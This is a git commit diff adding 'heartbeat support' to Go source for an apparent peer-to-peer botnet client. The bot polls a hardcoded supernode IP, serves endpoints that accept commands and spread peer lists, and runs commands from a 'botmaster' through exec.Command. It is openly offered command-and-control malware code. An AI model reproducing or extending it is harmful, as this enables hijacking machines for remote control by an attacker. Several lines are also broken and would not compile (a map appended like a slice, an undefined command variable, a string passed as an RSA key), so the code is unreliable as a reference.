fe0c5f147aaafdeb2788fc8208f98d1a4be6ba40
Ajdin Halac <halac.ajdin@nsoft.com>
2020-02-05 14:15:06 +0100

    Add heartbeat support

--- main.go
+++ main.go
@@ -1,11 +1,11 @@
 package main
 
 import (
-	"bytes"
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha256"
 	"encoding/json"
-	"fmt"
-	"io"
-	"log"
+	"net"
 	"net/http"
 	"os/exec"
 	"strings"
@@ -14,112 +14,83 @@ import (
 
 type BotFunc interface {
 	Online()
-	StartSupernode()
-	AddNewSupernode(node string)
+	Supernode()
 	InvokeCommand()
 }
 
 type Bot struct {
-	IP 			string
-	Supernodes  []string
-	Commands    []string
-	Publickey   string
+	IP 			 string
+	Port         string
+	Command      string
+	Publickey    string
+	Supernodes   map[string]int
 	OnlineTicker *time.Ticker
 }
 
+type Online struct {
+	Command      string         `json:"command"`
+	Supernodes   map[string]int `json:"supernodes"`
+}
+
 func main() {
-	//List of supernodes
 	//Public key used to decrypt a command sent from botmaster encrypted with private key
-	//Start as a worker, if connection can be recieved, switch to supernode
-	//Receive Command
-	//Send Command
 	//Execute Command
+	//HeartBeat, remove if 3 missed
+	//Turn of http after 15 minutes if not supernode
 	bot := Bot{
-		Supernodes: []string{"77.88.124.125:8080"},
-		Commands: []string{},
-		Publickey: "",
+		Port:         ":8080",
+		Command:      "",
+		Publickey:    "",
+		Supernodes:   map[string]int{"77.88.124.125": 0},
 		OnlineTicker: time.NewTicker(5 * time.Minute),
 	}
-	go bot.StartSupernode()
+	go bot.Supernode()
 	bot.Online()
 }
 
-func(b *Bot)StartSupernode() {
+func(b *Bot)Supernode() {
 	defer func() {
 		recover()
 	}()
-	http.HandleFunc("/AddNewSupernode/", func(w http.ResponseWriter, r *http.Request) {
-		b.IP = strings.TrimPrefix(r.URL.Path, "/AddNewSupernode/")
-		json.NewEncoder(w).Encode(true)
-	})
 	http.HandleFunc("/ReceiveCommand/", func(w http.ResponseWriter, r *http.Request) {
-		command := strings.TrimPrefix(r.URL.Path, "/ReceiveCommand/")
-		b.Commands = []string{command}
+		b.Command = strings.TrimPrefix(r.URL.Path, "/ReceiveCommand/")
 		json.NewEncoder(w).Encode(true)
 	})
 	http.HandleFunc("/Online", func(w http.ResponseWriter, r *http.Request) {
-		go b.AddNewSupernode(r.RemoteAddr)
-		var respBody map[string][]string
-		respBody["supernodes"] = b.Supernodes
-		respBody["commands"] = b.Commands
+		b.IP, _, _ = net.SplitHostPort(r.URL.Host)
+		ip, _, _ := net.SplitHostPort(r.RemoteAddr)
+		b.Supernodes[ip] = 0
+		respBody := Online{
+			Command:    b.Command,
+			Supernodes: b.Supernodes,
+		}
 		json.NewEncoder(w).Encode(respBody)
 	})
-	if err := http.ListenAndServe(":8080", nil); err != nil {
+	if err := http.ListenAndServe(b.Port, nil); err != nil {
 		panic(err)
 	}
 }
 
-func(b *Bot)Online() {
+func(bot *Bot)Online() {
 	for {
-		for _, supernode := range b.Supernodes {
-			resp, err := http.Get(supernode + "/Online")
+		for supernode, heartbeat := range bot.Supernodes {
+			resp, err := http.Get(supernode + bot.Port + "/Online")
 			if err != nil {
 				panic(err)
 			}
-			var respBody map[string][]string
+			var respBody Online
 			json.NewDecoder(resp.Body).Decode(&respBody)
-			b.Supernodes = b.UniqueSupernodes(append(b.Supernodes, respBody["supernodes"]...))
-			b.Commands = respBody["commands"]
+			bot.Command = respBody.Command
+			bot.Supernodes = append(bot.Supernodes, respBody["supernodes"]...)
 			resp.Body.Close()
 		}
-		b.InvokeCommand()
-	<-b.OnlineTicker.C
+		bot.InvokeCommand()
+		<-bot.OnlineTicker.C
 	}
 }
 
-func(b *Bot)AddNewSupernode(node string) {
-	defer func() {
-		recover()
-	}()
-	resp, err := http.Get(node + "/AddNewSupernode/" + node)
-	if err != nil {
-		panic(err)
-	}
-	b.Supernodes = b.UniqueSupernodes(append(b.Supernodes, node))
-	resp.Body.Close()
-}
-
-func(b *Bot)InvokeCommand() {
-	cmd := exec.Command("/bin/ls", []string{app, "-l"}, nil, "", exec.DevNull, exec.Pipe, exec.Pipe)
-
-	var b bytes.Buffer
-	io.Copy(&b, cmd.Stdout)
-	fmt.Println(b.String())
-
-}
-
-func(b *Bot) UniqueSupernodes(supernodes []string) []string {
-	keys := make(map[string]bool)
-	list := []string{}
-	if b.IP != "" {
-		keys[b.IP] = true
-	}
-
-	for _, entry := range supernodes {
-		if _, value := keys[entry]; !value {
-			keys[entry] = true
-			list = append(list, entry)
-		}
-	}
-	return list
+func(bot *Bot)InvokeCommand() {
+	plainTextCommand, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, bot.Publickey, command)
+	cmd := exec.Command(string(plainTextCommand))
+	cmd.Start()
 }
